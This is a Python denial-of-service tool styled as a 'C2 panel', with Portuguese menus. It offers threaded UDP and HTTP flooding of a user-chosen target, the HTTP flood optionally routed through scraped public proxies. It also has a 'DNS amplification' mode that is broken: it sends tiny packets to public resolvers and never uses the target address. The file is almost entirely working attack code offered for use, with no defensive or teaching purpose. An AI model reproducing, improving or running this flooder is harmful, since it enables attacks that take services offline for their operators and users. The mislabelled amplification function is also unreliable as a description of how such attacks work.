import threading
import socket
import random
import time
import requests
import os
import sys
import itertools

from datetime import datetime

# Cores
class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Logo Principal
logo = f"""{colors.OKGREEN}
██╗███╗   ██╗███████╗███████╗██████╗  █████╗ ██╗     ██╗     
██║████╗  ██║██╔════╝██╔════╝██╔══██╗██╔══██╗██║     ██║     
██║██╔██╗ ██║█████╗  █████╗  ██████╔╝███████║██║     ██║     
██║██║╚██╗██║██╔══╝  ██╔══╝  ██╔═══╝ ██╔══██║██║     ██║     
██║██║ ╚████║██║     ██║     ██║     ██║  ██║███████╗███████╗ 
╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝     ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ 
                  {colors.FAIL} INFERNAL LCS - C2 PANEL {colors.ENDC}
"""

# Barra de Carregamento
def loading_animation(text="Carregando"):
    for c in itertools.cycle(['|', '/', '-', '\\']):
        sys.stdout.write(f'\r{colors.OKCYAN}[{c}] {text}...{colors.ENDC}')
        sys.stdout.flush()
        time.sleep(0.1)

# Limpar Tela
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Variáveis globais
packet_count = 0
connection_count = 0
error_log = []
success_log = []

# Funções de ataque
def udp_flood(target_ip, target_port, duration, threads):
    global packet_count
    timeout = time.time() + duration
    bytes = random._urandom(1024)

    def attack():
        global packet_count
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(bytes, (target_ip, target_port))
                packet_count += 1
                success_log.append(f"UDP Packet sent to {target_ip}:{target_port}")
                print(f"{colors.OKGREEN}[+] Packet sent to {target_ip}:{target_port}{colors.ENDC}")
            except Exception as e:
                error_log.append(str(e))
                print(f"{colors.FAIL}[-] UDP Error: {e}{colors.ENDC}")

    for _ in range(threads):
        threading.Thread(target=attack).start()

def http_flood(target_url, duration, threads, use_proxy=False):
    global connection_count
    proxies_list = []
    timeout = time.time() + duration

    if use_proxy:
        proxies_list = proxy_scraper()

    def attack():
        global connection_count
        while time.time() < timeout:
            try:
                proxy = None
                if proxies_list:
                    proxy = {"http": random.choice(proxies_list)}
                requests.get(target_url, proxies=proxy)
                connection_count += 1
                success_log.append(f"HTTP Request sent to {target_url}")
                print(f"{colors.OKGREEN}[+] HTTP Request sent to {target_url}{colors.ENDC}")
            except Exception as e:
                error_log.append(str(e))
                print(f"{colors.FAIL}[-] HTTP Error: {e}{colors.ENDC}")

    for _ in range(threads):
        threading.Thread(target=attack).start()

def dns_amplification(target_ip, duration):
    global packet_count
    timeout = time.time() + duration
    dns_servers = ["8.8.8.8", "1.1.1.1"]

    def attack():
        global packet_count
        while time.time() < timeout:
            try:
                server = random.choice(dns_servers)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"\x00\x00", (server, 53))
                packet_count += 1
                success_log.append(f"DNS Amplification to {server}")
                print(f"{colors.OKGREEN}[+] DNS Amplification to {server}{colors.ENDC}")
            except Exception as e:
                error_log.append(str(e))
                print(f"{colors.FAIL}[-] DNS Error: {e}{colors.ENDC}")

    threading.Thread(target=attack).start()

# Proxy Scraper
def proxy_scraper():
    try:
        res = requests.get("https://www.proxy-list.download/api/v1/get?type=http")
        proxies = res.text.split("\r\n")
        print(f"{colors.OKGREEN}[+] Proxies Scraped: {len(proxies)}{colors.ENDC}")
        return proxies
    except Exception as e:
        error_log.append(str(e))
        print(f"{colors.FAIL}[-] Proxy Scraping Error: {e}{colors.ENDC}")
        return []

# Monitoramento ao Vivo
def live_monitor(duration):
    start = time.time()
    while time.time() - start < duration:
        elapsed = int(time.time() - start)
        sys.stdout.write(f"\r{colors.OKBLUE}Tempo: {elapsed}s | Pacotes: {packet_count} | Conexões: {connection_count}{colors.ENDC}")
        sys.stdout.flush()
        time.sleep(1)
    print()

# Menu
def menu():
    clear()
    print(logo)
    print(f"{colors.OKCYAN}=== MENU DE ATAQUES ==={colors.ENDC}")
    print(f"{colors.OKGREEN}[1]{colors.ENDC} UDP-FLOOD   {colors.OKGREEN}(L4){colors.ENDC}")
    print(f"{colors.OKGREEN}[2]{colors.ENDC} HTTP-FLOOD  {colors.OKGREEN}(L7){colors.ENDC}")
    print(f"{colors.OKGREEN}[3]{colors.ENDC} DNS-AMPLIFICATION {colors.OKGREEN}(L3){colors.ENDC}")
    print(f"{colors.OKGREEN}[0]{colors.ENDC} Sair")
    choice = input(f"\n{colors.WARNING}Selecione a opção: {colors.ENDC}")
    return choice

# Logs de sucesso e erro
def show_logs():
    print(f"\n{colors.OKCYAN}===== SUCESSOS ====={colors.ENDC}")
    for log in success_log[-10:]:
        print(f"{colors.OKGREEN}[+]{colors.ENDC} {log}")
    print(f"\n{colors.WARNING}===== ERROS ====={colors.ENDC}")
    for log in error_log[-10:]:
        print(f"{colors.FAIL}[-]{colors.ENDC} {log}")

# Controle principal
def main():
    while True:
        choice = menu()

        if choice == "1":
            target_ip = input("IP do Alvo: ")
            target_port = int(input("Porta: "))
            duration = int(input("Duração do ataque (s): "))
            threads = int(input("Número de Threads: "))

            threading.Thread(target=udp_flood, args=(target_ip, target_port, duration, threads)).start()
            live_monitor(duration)
            show_logs()

        elif choice == "2":
            target_url = input("URL do Alvo (ex: http://site.com): ")
            duration = int(input("Duração do ataque (s): "))
            threads = int(input("Número de Threads: "))
            use_proxy = input("Usar Proxies? (s/n): ").lower() == 's'

            threading.Thread(target=http_flood, args=(target_url, duration, threads, use_proxy)).start()
            live_monitor(duration)
            show_logs()

        elif choice == "3":
            target_ip = input("IP do Alvo: ")
            duration = int(input("Duração do ataque (s): "))

            threading.Thread(target=dns_amplification, args=(target_ip, duration)).start()
            live_monitor(duration)
            show_logs()

        elif choice == "0":
            print(f"{colors.FAIL}Saindo...{colors.ENDC}")
            break

        else:
            print(f"{colors.FAIL}Opção inválida.{colors.ENDC}")

        input(f"\n{colors.WARNING}Pressione ENTER para voltar ao menu.{colors.ENDC}")

if __name__ == "__main__":
    main()
